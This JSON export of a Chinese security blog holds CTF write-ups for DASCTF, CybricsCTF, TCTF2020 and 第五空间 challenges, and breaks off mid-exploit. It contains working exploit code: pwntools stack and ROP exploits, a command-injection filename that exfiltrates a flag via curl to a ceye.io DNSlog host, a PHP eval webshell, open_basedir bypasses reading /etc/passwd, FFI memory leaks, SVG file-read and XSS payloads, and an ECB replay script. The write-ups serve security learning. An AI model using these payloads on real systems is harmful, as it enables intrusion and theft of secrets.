{"pages":[{"title":"404","text":"您访问的页面不存在😶 再逛逛呗😏","link":"/404.html"},{"title":"categories","text":"","link":"/archives/index.html"},{"title":"friends","text":"申请友链须知 原则上只和技术类博客交换，但不包括含有和色情、暴力、政治敏感的网站。 不和剽窃、侵权、无诚信的网站交换，优先和具有原创作品的网站交换。 申请请提供：站点名称、站点链接、站点描述、logo或头像（不要设置防盗链）。 排名不分先后，刷新后重排，更新信息后请留言告知。 本站不存储友链图片，如果友链图片换了无法更新。图片裂了的会替换成默认图，需要更换的请留言告知。 本站友链信息如下，申请友链前请先添加本站信息： I D：ggb0n 网站图标：http://ggb0n.cool/images/header.jpg 网站地址：http://ggb0n.cool 网站简介：技术分享，网络安全，CTF，机器学习 加载中，稍等几秒...","link":"/friend/index.html"},{"title":"comment","text":"欢迎指点~🧐","link":"/message/index.html"},{"title":"tags","text":"","link":"/tags/index.html"},{"title":"about","text":"个人简介 个人信息：略懂网络安全、略学机器学习、略会CTF、略略略~~~追求更深远的学习，学到新知识就会心潮澎湃！QQ：1727355549邮箱：gg.b0n@qq.com \\ 9g.b0nd@gmail.com 博客信息 本站点主要记录一些日常学习，一些CTF比赛题解、赛题复现。希望能与同仁们分享知识与技术，当然我自己还是比较菜滴，路过的师傅，还请多多指点呀。 计划 2020-GOALS 2020.04.16 提升能力💀 2020.04.17 完成毕业设计💪 2020.04.17 学习PWN💀 时间轴记录","link":"/about/index.html"},{"title":"categories","text":"","link":"/categories/index.html"}],"posts":[{"title":"DASCTF七月月赛PWN","text":"尝试做做pwn题，结果很失败，不过学到了新东西。 qiandao简单的栈溢出，但是在leave指令后，利用lea指令给esp赋值别的地址，导致我们覆盖到返回地址的地址不能被跳转。 分析首先需要明白在函数返回时leave和ret两条指令的本质： leave指令相当于mov esp,ebp; pop ebp;即恢复上一个函数的栈结构 ret指令则相当于pop esp;也就是在ebp出栈之后，esp其实是指向返回地址的，就会将当前栈顶内容弹出到eip中进行执行 而lea和mov指令呢？ lea是load effective address的缩写，简单的说，lea指令可以用来将一个内存地址直接赋给目的操作数，例如：lea eax,[ebx+8]就是将ebx+8这个值直接赋给eax，而不是把ebx+8处的内存地址里的数据赋给eax。 而mov指令则恰恰相反，例如：mov eax,[ebx+8]则是把内存地址为ebx+8处的数据赋给eax。 再看一下这道题目中函数调用结束的指令： 在leave和ret之间执行了lea esp,[ecx-4]也就是将esp指向了ecx-4这个地址，这个地址在哪？我们看到前面的mov ecx,[ebp+var_4]得知了ecx存放的是ebp+var_4地址上的内容，而var_4是栈上比ebp低四字节的位置： 也就是说esp=[ebp-4]-4 同时程序又存在格式化字符出纳漏洞，那整个思路就很明显了： 1、格式化字符串泄露栈地址 2、修改ebp-4处的值为可控地址 3、在可控地址-4的位置存放backdoor的地址 我们先看一下能不能通过输入格式化字符串输出ebp地址：%p%p%p%p%p%p%p%p%p 从图中的结果可以看到，第二个参数输出的内容正是栈底地址。 注意：指出个容易混淆的地方 在用代码attach的时候，发现ebp中是有三个地址(下图)，第三个才是真正的main函数的栈底地址，刚开始很困惑为什么ebp不是输出的值？思考半天才想起来main函数中调用了多次的puts和gets函数，attach的时候是在调用函数栈中的。 由此构造下payload： stack_addr = int(p.recv(8),16) - 0x24 # 这里是接收到的栈底地址的低0x24字节的地方，它的低4字节存放backdoor的地址payload2 = p32(back_addr) + '\\x00'*0x20 + p32(stack_addr) # 这里第二次输入，从ebp-0x28的地方输入的，所以中间填充0x20个\\x00，然后用stack_addr覆盖ebp-0x4的值，使lea指令之后的esp-4指向存放backdoor地址的地方 构造exp如下： expfrom pwn import *context.log_level = 'debug'p = process('./qiandao')#p = remote('183.129.189.60',10013)back_addr = 0x0804857Dpayload1 = '%2$p'p.recvuntil('name:')p.sendline(payload1)gdb.attach(p)p.recvuntil('0x')stack_addr = int(p.recv(8),16) - 0x24payload2 = p32(back_addr) + '\\x00'*0x20 + p32(stack_addr)p.recvuntil('problem?')#gdb.attach(p)p.sendline(payload2)#gdb.attach(p)p.interactive()","link":"/2020/07/26/DASCTF%E4%B8%83%E6%9C%88%E6%9C%88%E8%B5%9BPWN/"},{"title":"CybricsCTF","text":"记得去年是放假回家的路上比赛开始的，回到家开始做，结果一道题也没出… 今年还行，简单题能做做。 Misc-Hellish Reversebinwalk直接拿到flag Misc-Krevedkahttp流量溯源 解题题目说是一个内网用户用另一个用户的账号caleches进行登录，那我们就找caleches提交申请的POST包： urlencoded-form.value==\"caleches\" 可以看到三个提交登录的报文： 密码是vixie和%20+or+1%3D1+--显然包含第二个密码的报文是攻击者提交的，可以在该报文中拿到他浏览器的User-Agent信息，然后再用此信息去数据包中找其他包含此信息的报文，便可以找到攻击者提交的报文记录，其中包含他自己的用户名： http.user_agent==\"UCWEB/2.0 (Linux; U; Opera Mini/7.1.32052/30.3697; www1.smart.com.ph/; GT-S5360) U2/1.0.0 UCBrowser/9.8.0.534 Mobile\" Misc-Kyshooter考察视频分帧/慢放，好吧，其实考的是眼力。。。 解题ffmpeg对视频进行分帧， ffmpeg.exe -i speeded.mp4 -r 30 %3d.png 结合Potplayer0.2倍速慢放，再多次尝试得到密码mahchoudqotlzeeb，看到视频里的加密是： openssl enc -aes-256-cbc -in flag.txt -out flag.txt.enc 用aes-256-cbc解密即可： openssl enc -d -aes-256-cbc -in flag.txt.enc -out flag.txt 刚开始用ubuntu16死活解密错误，以为是密码错了，狂猜密码都不行，后来偶然间用ubuntu18才解正确，魔幻。。。 MISC-XCor简单流量审计 解题拿到流量包，可导出net10.exe的对象，需要输入用户名，然后在流量包中找到了包含用户名的两个报文： 拿到用户名登录即可拿到flag Crypto-Mic Check签到密码题，提示说是与Windows的UserAssist加密，其实就是ROT-13加密，字母对应如下 ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzNOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm 替换回去即可。 Crypto-Broken Invitation题目给了三组公钥、且e=3，显然是低加密指数广播攻击，代码如下： from functools import reduceimport binascii, gmpy2from Crypto.Util.number import long_to_bytesn = [0x8aa5dfa13fd16765b7a220eac8731dbc2865772496325b671e742ec391249bbddc4aaa3c8264a0ba5de8843d161dcbb5eb02813fcf14aab3ef315845228864b9fb426620bedb146237f2095adcaa233280bdd526aa2238e66b222c880fd4d78efacc56a887,0x3eff009b4c43b714ff55f38fa16a633f266ca10e7500c568715d91b650573f66dcb6266be76da94b9ca7c394a9b65fed6e7b8522a1da640ce7033fd933aa1c3e4a1fd0747c1b17ec2fa1239299beaa269752944d7cc084ee145985f1,0x698a394fbc84898d0a276f457de4166ffcb6c96736621de30892e66585da3077f7e6298f23fb31b511989692a1fd4d1ebc7ded8d35f93a80de69fb9ec1003af55484f5638215aa84866191df9baa56a394179f66243e803b0df8c789c8755eef4e431205264205]c = [0x3a4fe4c9a1318194d364e7a67b7e34dbb02c3f2e63f52b26bb8b3ef349807679c0ff95245187b5ddbc1baaa4a808137d456696cfb3ebe47b7853cec33c709d9ce8b46272f7b0b0e69dd4091920b968b8ad37686e24b800928732daf924f98945267cfd156a,0x2ed28a3bb70af3820c5fc9e27f16b8d893ba578bcf1d879a32898c8e4e0f4b3fdf339889f9a44026de783786e62f1fe8fc25770bf89519c2fbd66d2cc6c02ffae8722b4391173993fa3f993b3318f07ca9a31df84a48959bfd0e06a,0x63faaa3d6c3585425190d755347f6cd8913805f7edc551096322d105f24a6339c8f0ac1025db08cbda89195818acdeaea42a9273b10b874ec63e7d986f1172988a700308bc72f3d4531c9ec08e2ec06f5c00c54cc54d13b44ff33eb3851231fb591a0c15e220ac]def CRT(mi, ai): assert(reduce(gmpy2.gcd,mi)==1) assert (isinstance(mi, list) and isinstance(ai, list)) M = reduce(lambda x, y: x * y, mi) ai_ti_Mi = [a * (M // m) * gmpy2.invert(M // m, m) for (m, a) in zip(mi, ai)] return reduce(lambda x, y: x + y, ai_ti_Mi) % Me=0x3m=gmpy2.iroot(CRT(n, c), e)[0]m = long_to_bytes(m)s = str(m)print(s[::-1]) Reverse-Babyrev简单逆向，不然也做不出来 解题给了xml文件，题目还提示：snap.berkeley.edu/offline 下载snap，打开xml文件可以得到加密逻辑： 可以看到是与33进行异或，拿最后的结果异或回去即可： list = [66,88,67,83,72,66,82,90,86,18,77,16,98,17,76,18,126,97,79,69,126,102,17,17,69,126,77,116,66,74,0,92]flag = \"\"for i in range(len(list)): tmp = list[i] flag+=chr(tmp^33)print flag Web-Hunt五个验证码，全验证对了就行，这题得科学上网，要不然验证码你都拿不到。。。 Web-Gif2png题目提供了源码： import loggingimport reimport subprocessimport uuidfrom pathlib import Pathfrom flask import Flask, render_template, request, redirect, url_for, flash, send_from_directoryfrom flask_bootstrap import Bootstrapimport osfrom werkzeug.utils import secure_filenameimport filetypeALLOWED_EXTENSIONS = {'gif'}app = Flask(__name__)app.config['UPLOAD_FOLDER'] = './uploads'app.config['SECRET_KEY'] = '********************************'app.config['MAX_CONTENT_LENGTH'] = 500 * 1024 # 500KbffLaG = \"cybrics{********************************}\"Bootstrap(app)logging.getLogger().setLevel(logging.DEBUG)def allowed_file(filename): return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS@app.route('/', methods=['GET', 'POST'])def upload_file(): logging.debug(request.headers) if request.method == 'POST': if 'file' not in request.files: logging.debug('No file part') flash('No file part', 'danger') return redirect(request.url) file = request.files['file'] if file.filename == '': logging.debug('No selected file') flash('No selected file', 'danger') return redirect(request.url) if not allowed_file(file.filename): logging.debug(f'Invalid file extension of file: {file.filename}') flash('Invalid file extension', 'danger') return redirect(request.url) if file.content_type != \"image/gif\": logging.debug(f'Invalid Content type: {file.content_type}') flash('Content type is not \"image/gif\"', 'danger') return redirect(request.url) if not bool(re.match(\"^[a-zA-Z0-9_\\-. '\\\"\\=\\$\\(\\)\\|]*$\", file.filename)) or \"..\" in file.filename: logging.debug(f'Invalid symbols in filename: {file.content_type}') flash('Invalid filename', 'danger') return redirect(request.url) if file and allowed_file(file.filename): filename = secure_filename(file.filename) file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename)) mime_type = filetype.guess_mime(f'uploads/{file.filename}') if mime_type != \"image/gif\": logging.debug(f'Invalid Mime type: {mime_type}') flash('Mime type is not \"image/gif\"', 'danger') return redirect(request.url) uid = str(uuid.uuid4()) os.mkdir(f\"uploads/{uid}\") logging.debug(f\"Created: {uid}. Command: ffmpeg -i 'uploads/{file.filename}' \\\"uploads/{uid}/%03d.png\\\"\") command = subprocess.Popen(f\"ffmpeg -i 'uploads/{file.filename}' \\\"uploads/{uid}/%03d.png\\\"\", shell=True) # 命令执行 command.wait(timeout=15) logging.debug(command.stdout) flash('Successfully saved', 'success') return redirect(url_for('result', uid=uid)) return render_template(\"form.html\")@app.route('/result/&lt;uid&gt;/')def result(uid): images = [] for image in os.listdir(f\"uploads/{uid}\"): mime_type = filetype.guess(str(Path(\"uploads\") / uid / image)) if image.endswith(\".png\") and mime_type is not None and mime_type.EXTENSION == \"png\": images.append(image) return render_template(\"result.html\", uid=uid, images=images)@app.route('/uploads/&lt;uid&gt;/&lt;image&gt;')def image(uid, image): logging.debug(request.headers) dir = str(Path(app.config['UPLOAD_FOLDER']) / uid) return send_from_directory(dir, image)@app.errorhandler(413)def request_entity_too_large(error): return \"File is too large\", 413if __name__ == \"__main__\": app.run(host='localhost', port=5000, debug=False, threaded=True) 代码中可以进行命令注入，我注释了，但是命令打过去没有得到结果。。。应该是题目服务器存在防火墙阻止了通过80端口向外进行资源请求，因此考虑利用DNSlog拿命令执行的结果，参考这里。 如果想往DNS平台上打，就需要执行一些命令，但是字符进行了限制： if not bool(re.match(\"^[a-zA-Z0-9_\\-. '\\\"\\=\\$\\(\\)\\|]*$\", file.filename)) or \"..\" in file.filename: logging.debug(f'Invalid symbols in filename: {file.content_type}') flash('Invalid filename', 'danger') return redirect(request.url) 会从文件名的头部开始到文件名结尾进行多次匹配，如果字符在a-zA-Z0-9_-. '&quot;=$()|之中，则bool函数处理后是1，加上前面的not转为0，也就通过了检测，所以我们构造的文件名必须在上述字符的范围内。 解题这里用了http://ceye.io/平台 需要构造payload如下： flag=$(cat main.py|grep -wo cybrics{.*|base64|tr -d '=');curl $flag.o3svs0.ceye.io 可以看到其中{*字符都不在白名单里，因此需要进行处理，base64是个不错的选择 base64结果： ZmxhZz0kKGNhdCBtYWluLnB5fGdyZXAgLXdvIGN5YnJpY3N7Lip8YmFzZTY0fHRyIC1kICc9Jyk7Y3VybCAkZmxhZy5vM3N2czAuY2V5ZS5pbw== 包裹上命令： echo ZmxhZz0kKGNhdCBtYWluLnB5fGdyZXAgLXdvIGN5YnJpY3N7Lip8YmFzZTY0fHRyIC1kICc9Jyk7Y3VybCAkZmxhZy5vM3N2czAuY2V5ZS5pbw==|base64 -d | sh 最终文件名： ggb0n'||echo ZmxhZz0kKGNhdCBtYWluLnB5fGdyZXAgLXdvIGN5YnJpY3N7Lip8YmFzZTY0fHRyIC1kICc9Jyk7Y3VybCAkZmxhZy5vM3N2czAuY2V5ZS5pbw==|base64 -d | sh||'.gif 然后上传、抓包、改文件名、改文件类型，在DNS平台获取结果：","link":"/2020/07/26/CybricsCTF/"},{"title":"TCTF2020部分题解","text":"比赛的时候做题一头雾水，很多题一知半解，不能自己独立完成，赛后看飘零师傅的题解进一步学习。 Cloud Computing一道出在了 Misc 的题目，但是考的是 web 的 open_basedir bypass。 进入题目，给出源码： &lt;?phperror_reporting(0);include 'function.php';$dir = 'sandbox/' . sha1($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT']) . '/';if(!file_exists($dir)){ mkdir($dir);}switch ($_GET[\"action\"] ?? \"\") { case 'pwd': echo $dir; break; case 'upload': $data = $_GET[\"data\"] ?? \"\"; if (waf($data)) { die('waf sucks...'); } file_put_contents(\"$dir\" . \"index.php\", $data); case 'shell': initShellEnv($dir); include $dir . \"index.php\"; break; default: highlight_file(__FILE__); break;} 显然需要在传参upload时写入小马 getshell，然后再传参shell来进行 RCE。 解题由于引号，下划线等字符等字符被ban掉了，因此考虑无参数RCE，利用eval(end(getallheaders()))的方式结合在请求头中添加要执行的code从而bypass waf。 data = \"&lt;?=eval(end(getallheaders()));?&gt;\"code = r\"var_dump('ggb0n');\"headers = {'a':code} 执行结果如下： 但是依旧无法使用 phpinfo 等函数，怀疑是被disable_function给禁了，这里开启报错查看原因： code = r\"error_reporting(-1);phpinfo();\" 可以看到函数确实被禁了，同时借助 readfile 函数发现开启了 open basedir： 但是 sandbox 中可以任意创建文件和目录，因此可以结合 mkdir 和 chdir 进行 bypass，payload 如下： code = \"error_reporting(E_ALL);chdir('sandbox/52933f6438c743819c0d2b1031d5547ab025d7d1/');mkdir('x');chdir('x');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print(base64_encode(file_get_contents('/etc/passwd')));\" 回显如下： 可见成功 bypass，然后读取根目录下的 flag 文件即可，拿到一个 img 文件，其中隐藏了 flag 的图片。 完整exp如下： import requestsimport urllib url = \"http://pwnable.org:47780/?action=upload&amp;data=%s\"data = \"&lt;?=eval(end(getallheaders()));?&gt;\"#code = r\"var_dump('ggb0n');\"#code = r\"error_reporting(-1);phpinfo();\"#code = r\"error_reporting(-1);readfile('/etc/passwd');\"#code = \"error_reporting(E_ALL));chdir('/var/www/html/sandbox/52933f6438c743819c0d2b1031d5547ab025d7d1/');mkdir('ggb0n');chdir('ggb0n');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');readfile('/etc/passwd');\"code = \"error_reporting(E_ALL);chdir('sandbox/52933f6438c743819c0d2b1031d5547ab025d7d1/');mkdir('x');chdir('x');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print(base64_encode(file_get_contents('/flag')));\"headers = {'a':code}dir_url = \"http://pwnable.org:47780/?action=pwd\"first_url = url % datasecond_url = \"http://pwnable.org:47780/?action=shell\"r = requests.get(url=dir_url)print(r.content)r = requests.get(url=first_url,headers=headers)print(r.content)r = requests.get(url=second_url,headers=headers)print(r.content) Wechat Generator这题考察 ImageMagick 和 XSS 解题拿到题目发现是一个生成聊天图片的页面，有 preview 和 share 两个按钮，前者用于生成，后者用于分享。 share 按钮可以获取到一个 url，即为生成图片的 url 访问该路径可以得到如下信息： 图中可以看到，我们会得到一个 png 的路径，浏览器去访问就可以得到生成的 png 图片，如果将 png 改为 txt 则会报错，但是改为 htm 却可以正常访问： 可以看到，回显中包含提交的信息字段内容，并且解析为 html 了，那么我们是否可以考虑引入标签进行闭合？ 先看下 data 传参的内容： 我们构造 data 内容去读取flag试试，构造如下payload： [{\"type\":0,\"message\":\"[aaa\\\" /&gt;&lt;image width=\\\"512\\\" height=\\\"512\\\" href=\\\"text:/flag\\\"/&gt;]\"}] 提交之后点击 share 按钮访问，得到生成的图片，放大之后看到内容如下： 说明这个思路是对的，那尝试读取 web 文件路径，想要读取/proc/self/下的内容，但是proc被过滤，双写绕过即可： [{\"type\":0,\"message\":\"[aaa\\\" /&gt;&lt;image width=\\\"512\\\" height=\\\"512\\\" href=\\\"text:/prprococ/self\\\"/&gt;]\"}] 提交之后再次 share，得到图片信息如下： 说明这个方法是没问题的，通过寻找，可以发现/app/app.py存在，并且包含关键信息，如下payload读取： [{\"type\":0,\"message\":\"[aaa\\\" /&gt;&lt;image width=\\\"512\\\" height=\\\"512\\\" href=\\\"text:/app/app.py\\\"/&gt;]\"}] 可以看到，存在/SUp3r_S3cret_URL/0Nly_4dM1n_Kn0ws路由，访问之后，页面跳转： 也就是要我们去构造 xss，使服务端触发 alert(1) 但是题目中存在CSP： img-src * data:; default-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self'; object-src 'none'; base-uri 'self' 并且 src 被过滤，还是通过双写进行绕过，但是又找不到可控的 js 文件，于是考虑用meta标签进行跳转： [{\"type\":0,\"message\":\"[aaa\\\" /&gt;&lt;meMETAta content=\\\"0;url=http://ip/x.html\\\" http-equiv=\\\"refresh\\\"&gt;]\"}] 注意使用htm后缀。 easyphp考察 bypass open_basedir 解题首先 phpinfo 看一下，发现 disable_functions、open_basedir： 目录不可写，用如下的代码传参过去读取目录： $file_list = array();$it = new DirectoryIterator(\"glob:///*\");foreach ($it as $f){ $file_list[] = $f-&gt;__toString();}$it = new DirectoryIterator(\"glob:///.*\");foreach ($it as $f){ $file_list[] = $f-&gt;__toString();}sort($file_list);foreach ($file_list as $f){ echo \"{$f}\";} 发现了 flag.h 和 flag.o 的存在，蚁剑插件“脚本执行”执行如下代码读取 flag.h 内容： mkdir('minx');chdir('minx');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo file_get_contents('/flag.h'); 得到 flag.h 的内容如下： #define FFI_LIB \"/flag.so\"#define FFI_SCOPE \"flag\"char* flag_fUn3t1on_fFi(); php 7.4可使用 FFI 调用 c 函数，于是查看phpinfo，开启了 FFI。 再执行如下代码读取到 flag： $ffi = FFI::load(\"/flag.h\");$a = $ffi-&gt;flag_fUn3t1on_fFi();for ($i=0; $i &lt; 30; $i++) { print_r($a[$i]); } noeasyphp继续考察 FFI，只不过php版本提高了，API也更改了。 解题蚁剑脚本执行： var_dump(scandir('glob:///*')) 发现仍然存在 flag.h 和 flag.o，想办法读取 flag.h，但是不像上一题，直接给出了读取 flag 的函数名，并且将 FFI:cdef 给禁用了，只好利用 FFI 中与内存相关的函数进行内存泄露，从而获取函数名。 飘零师傅的 exp： import requestsurl = \"http://pwnable.org:19261\"params = {\"rh\":'''try { $ffi=FFI::load(\"/flag.h\"); //get flag //$a = $ffi-&gt;flag_wAt3_uP_apA3H1(); //for($i = 0; $i &lt; 128; $i++){ echo $a[$i]; //} $a = $ffi-&gt;new(\"char[8]\", false); $a[0] = 'f'; $a[1] = 'l'; $a[2] = 'a'; $a[3] = 'g'; $a[4] = 'f'; $a[5] = 'l'; $a[6] = 'a'; $a[7] = 'g'; $b = $ffi-&gt;new(\"char[8]\", false); $b[0] = 'f'; $b[1] = 'l'; $b[2] = 'a'; $b[3] = 'g'; $newa = $ffi-&gt;cast(\"void*\", $a); var_dump($newa); $newb = $ffi-&gt;cast(\"void*\", $b); var_dump($newb); $addr_of_a = FFI::new(\"unsigned long long\"); FFI::memcpy($addr_of_a, FFI::addr($newa), 8); var_dump($addr_of_a); $leak = FFI::new(FFI::arrayType($ffi-&gt;type('char'), [102400]), false); FFI::memcpy($leak, $newa-0x20000, 102400); $tmp = FFI::string($leak,102400); var_dump($tmp); //var_dump($leak); //$leak[0] = 0xdeadbeef; //$leak[1] = 0x61616161; //var_dump($a); //FFI::memcpy($newa-0x8, $leak, 128*8); //var_dump($a); //var_dump(777);} catch (FFI\\Exception $ex) { echo $ex-&gt;getMessage(), PHP_EOL;}var_dump(1);'''}res = requests.get(url=url,params=params)print((res.text).encode(\"utf-8\")) 获取到函数名$a = $ffi-&gt;flag_wAt3_uP_apA3H1(); 再次执行如下代码即可获取 flag： $ffi = FFI::load(\"/flag.h\");$a = $ffi-&gt;flag_wAt3_uP_apA3H1();for ($i=0; $i &lt; 30; $i++) { print_r($a[$i]); } lottery一道 web + crypto 题目，考察分组密码的重放攻击，利用多个用户进行偷钱。 解题题目共有五个接口：register、login、buy、info、charge 注册并登录之后可以购买 lottery 或者购买 flag，但是 coin 明显不够，需要通过购买 lottery 来增加 coin，但是仅仅这样几乎不可能凑得狗钱去买 flag。 首先看一下 buy、info、charge三个路由的作用： buy 可以购买 lottery，以此来增加 coin： 通过 bp 截包，可以发现点击 buy 之后，会跳转 info 路由，该路由是对上图中生成的 enc 进行解密，得到明文信息： charge 路由是提交购买 lottery 的申请： 比赛的时候尝试直接改 coin 传参的值，结果行不通，由于不知道密文的生成方式，后面就是密码学师傅做出来的了。赛后看飘零师傅的题解才明白是分组密码的重放攻击。 分析过程生成几组密文，结果发现每组密文的结尾是一样的， NFEbZFZjCg3gtWhc8Ys7VqHQA95DryQjHRh2tLARA2gqu5s\\/0Tt0wSubjKo9CR7rFnjfKMixVIRY5dbMQ9\\/5AYlLiR7zBGZoi3DhTX7idZjl51uaWb7fyDebazEdvb6joTDaZjFZc5Bt0z8ZhTNb0fbSt9reYD8AcCI4hIXsxZg=KS2YKOxItMGdsfQsaKqRtwIqSIxFrGVl\\/n0QqIvlfMJDLDFMDG67cwWd4r\\/fxwFdi5OUGyUHac9\\/FSi9\\/T54JBdL4iacaoV3cTJciBy8zyODFKFwXCcaytygQNtwfZdEK6FWrCvVHCIYPIch4ewOSPbSt9reYD8AcCI4hIXsxZg= 转为16进制发现最后的32位均为f6d2b7dade603f007022388485ecc598，应该是32位的padding，同时看到密文总长是256位。猜测位ECB分组模式的密码，普遍的攻击方式是重放攻击。 通过对两个不同用户的 enc 的 16 进制数据进行32、64、96、128位的替换，发现当替换128位时，将用户1的 lottery 完全替换为了用户2的 lottery，但是同时 user 的前两位也被替换了。 解题思路就是通过爆破注册多个可以使 user 的前两位一样的用户，爆破脚本如下： import requestsimport randomregister_url = 'http://pwnable.org:2333/user/register'login_url = 'http://pwnable.org:2333/user/login'lottery_url = 'http://pwnable.org:2333/lottery/buy'info_url = 'http://pwnable.org:2333/lottery/info'#charge_url = http://pwnable.org:2333/lottery/chargeusnamelist = \"abcdefghijklmnopqrstuvwxyz\"def register(usname,passwd,url): usname = usname passwd = passwd url = url data = {'username':usname,'password':passwd} r = requests.post(url=url,data=data) return r.contentdef login(usname,passwd,url): usname = usname passwd = passwd url = url data = {'username':usname,'password':passwd} r = requests.post(url=url,data=data) #return r.headers return r.contentdef buy(token,url): token = token url = url data = {'api_token':token} r = requests.post(url=url,data=data) return r.jsondef info(enc,url): enc = enc url = url data = {\"enc\":enc} r = requests.post(url=url,data=data) return r.jsonpasswd = 123for i in range(10000): usname = \"\" for j in range(random.randint(0,20)): usname += random.choice(usnamelist) print(register(usname,passwd,register_url)) 可以利用 linux 的管道方便地拿到满足要求的用户信息： python3 lottery爆破用户名.py | grep '\"uuid\":\"bc'b'{\"user\":{\"username\":\"misiifcyboqwa\",\"uuid\":\"bca638f6-ffb4-4c12-8c79-42add23d90e5\",\"updated_at\":\"2020-07-01T05:41:02.000000Z\",\"created_at\":\"2020-07-01T05:41:02.000000Z\",\"id\":630605}}'b'{\"user\":{\"username\":\"pnihrkpjeocgynhz\",\"uuid\":\"bce2d26c-92fa-48fc-a2c2-d5ff5e1da6f5\",\"updated_at\":\"2020-07-01T05:42:09.000000Z\",\"created_at\":\"2020-07-01T05:42:09.000000Z\",\"id\":630734}}'b'{\"user\":{\"username\":\"tkb\",\"uuid\":\"bc10a197-1215-4c4e-bdbe-25145108198d\",\"updated_at\":\"2020-07-01T05:42:46.000000Z\",\"created_at\":\"2020-07-01T05:42:46.000000Z\",\"id\":630799}}'b'{\"user\":{\"username\":\"csuxhbbrdtebsdpue\",\"uuid\":\"bc87488d-caee-411a-bf4f-c75a17090b5a\",\"updated_at\":\"2020-07-01T05:44:52.000000Z\",\"created_at\":\"2020-07-01T05:44:52.000000Z\",\"id\":631052}}'b'{\"user\":{\"username\":\"kncwealurtcj\",\"uuid\":\"bc7a033e-d341-42a0-b931-08592ee81e2f\",\"updated_at\":\"2020-07-01T05:47:43.000000Z\",\"created_at\":\"2020-07-01T05:47:43.000000Z\",\"id\":631362}}'b'{\"user\":{\"username\":\"cwbaszukw\",\"uuid\":\"bc09265e-f0d6-4104-bd11-bd6d29835a00\",\"updated_at\":\"2020-07-01T05:50:03.000000Z\",\"created_at\":\"2020-07-01T05:50:03.000000Z\",\"id\":631663}}'b'{\"user\":{\"username\":\"uhenpkasxlveidif\",\"uuid\":\"bc00fef1-ec7b-48e6-bc86-3f2ee89da15b\",\"updated_at\":\"2020-07-01T05:51:13.000000Z\",\"created_at\":\"2020-07-01T05:51:13.000000Z\",\"id\":631786}}'b'{\"user\":{\"username\":\"vwurpqhaavjihvuqokyx\",\"uuid\":\"bc248486-e6d2-437d-8b2d-ee2c3dad1a72\",\"updated_at\":\"2020-07-01T05:55:55.000000Z\",\"created_at\":\"2020-07-01T05:55:55.000000Z\",\"id\":632333}}'... 然后用下面的代码进行替换，将其他用户的 lottery 替换掉 user1 的 lottery，如此以来，就可以将其他用户的 coin 转移给 user1了，即可购买 flag。 import base64import urllibnow_c = \"IpG6gymO3Jhd9hgirFfF\\\\/GZ9An9W7hmfpWnFZEvQ9V4wKQrh4UbaaAm0rp2g2I4WirFyVLzg5KZKQxsPrT53Wot80sjMPhsXy0irOua24Da9KDh1YiMsqS6Q6KJWU5xTdbZ34x8c0bloA9X4\\\\/fMN6vbSt9reYD8AcCI4hIXsxZg=\"#now_c = now_c.decode('utf-8')another_c = \"RNeqoksqjZqjs30IlB4JPaQykvrhhJLviciRBGyYNT0DZbqCkAeQT3L9wJeKwt2FtxIuzzKznobqBur9sRvygvv3jwyYLL1MQR7+AzHT7kug1CQEqkGMqmKZk4ZsdpGluPGbrp5x9YrQ3PKM0MXGcvbSt9reYD8AcCI4hIXsxZg=\"#another_c = another_c.decode('utf-8')now_c = base64.b64decode(now_c).encode('hex')another_c = base64.b64decode(another_c).encode('hex')print now_cprint another_cindex = 128print urllib.quote(base64.b64encode((another_c[:index] + now_c[index:]).decode('hex'))) 注意由于每个 lottery 只能用一次，因此每个用于提供 coin 的用户每次都要重新生成 lottery，然后对 user1 的lottery进行替换即可。 还需要注意一点，由于 token 的存在，同一台 PC 只能保持一个用户的连接，再开一台虚拟机登录其他用户提供 coin 即可。 效果如下：","link":"/2020/06/29/TCTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"},{"title":"第五空间pwn题练习","text":"自做pwn题以来第一次打比赛，真正遇到题目果然是一脸懵逼。。。拿着师傅们的wp学习 twice拿到题目，看一下文件属性是64位的ELF，可以实现回显用户输入的功能。 查看一下保护，发现开启了NX、canary： 题目分析IDA反编译发现到sub_4007A9函数调用了puts函数，可以实现栈溢出 其中栈结构如下： 可知，我们输入的字符串被保存到参数s的位置，它到var_8（其实就是canary）的大小是0x58字节，因此溢出的难点就在于如何绕过canary的检测，这里由于是会回显用户输入的字符串，那么在0x58个字符之后再输入一个字符覆盖canary的\\x00字节，那么就可以将canary连带一起输入，其后的栈底地址也能一同输出，这便是突破点。 那么整体思路就是：第一次输入通过覆盖canary低字节泄露canary和rbp，第二次输入做栈迁移泄露出libc基址，随后再次迁移到栈顶位置然后构造payload覆盖返回地址为one_gadget，即可getshell。 exp比赛的时候好像没有提供 libc 版本，这样的话就多了一步 libc版本的确定，不过在复现的时候看到师傅直接写了libc-2.23.so，这样也方便学习了。 先找一下64位libc-2.23.so中的gadget： 最终exp如下： from pwn import *sh = process('5kjpwn1')elf = ELF('./5kjpwn1')libc = ELF('./libc-2.23.so')rdi_ret = 0x400923push_ebp = 0x4007a9leave_ret = 0x400879payload1 = 'a'*0x58 + 'b'sh.sendafter('&gt;', payload1)sh.recvuntil('b')canary = u64((sh.recv(7)).rjust(8,'\\x00'))stack = u64(sh.recv(6).ljust(8,'\\x00'))payload2 = 'c'*0x08 + p64(rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(push_ebp)payload2 = payload2.ljust(0x58, 'a')payload2 += p64(canary) + p64(stack-0x70) + p64(leave_ret)sh.sendafter('&gt;', payload2)sh.recvuntil('cccccccc')puts_addr = u64(sh.recv(6).ljust(8, '\\x00'))print hex(puts_addr)libc_base = puts_addr - libc.sym['puts']payload3 = 'a'*0x58 + p64(canary) + p64(0) + p64(libc_base + 0x45216)sh.sendafter('&gt;', 